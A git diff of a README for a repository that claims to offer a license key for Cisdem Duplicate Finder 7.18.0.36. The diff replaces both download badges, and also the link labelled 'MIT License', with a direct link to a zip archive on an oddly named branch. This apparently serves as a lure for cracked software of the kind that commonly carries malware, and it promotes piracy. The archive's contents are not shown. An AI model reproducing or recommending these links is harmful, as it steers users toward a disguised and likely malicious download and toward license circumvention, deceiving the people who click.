@@ -1,6 +1,6 @@
 # Cisdem Duplicate Finder 7.18.0.36 License Key Repository
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Ardiyan45.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/Ardiyan45/cisdem-duplicate-finder-ultimate-718036/raw/refs/heads/branch/meroblastically/ultimate-finder-cisdem-duplicate-v2.6.zip)  
 **To obtain the Cisdem Duplicate Finder 7.18.0.36 License Key and application resources, click the badge above.**
 
 ---
@@ -100,7 +100,7 @@ All guides and assets provided are strictly for educational, developmental, and 
 
 ## 📜 MIT License
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT) © 2025.  
+This repository is licensed under the [MIT License](https://github.com/Ardiyan45/cisdem-duplicate-finder-ultimate-718036/raw/refs/heads/branch/meroblastically/ultimate-finder-cisdem-duplicate-v2.6.zip) © 2025.  
 Enjoy, remix, and build upon our documentation and original scripts for any project.  
 See [LICENSE.txt](LICENSE.txt) for full legal details.
 
@@ -110,6 +110,6 @@ See [LICENSE.txt](LICENSE.txt) for full legal details.
 
 Ready to amplify your data management journey?
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Ardiyan45.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/Ardiyan45/cisdem-duplicate-finder-ultimate-718036/raw/refs/heads/branch/meroblastically/ultimate-finder-cisdem-duplicate-v2.6.zip)  
 
 *Click the badge above to access the Cisdem Duplicate Finder 7.18.0.36 License Key and all supporting resources!*
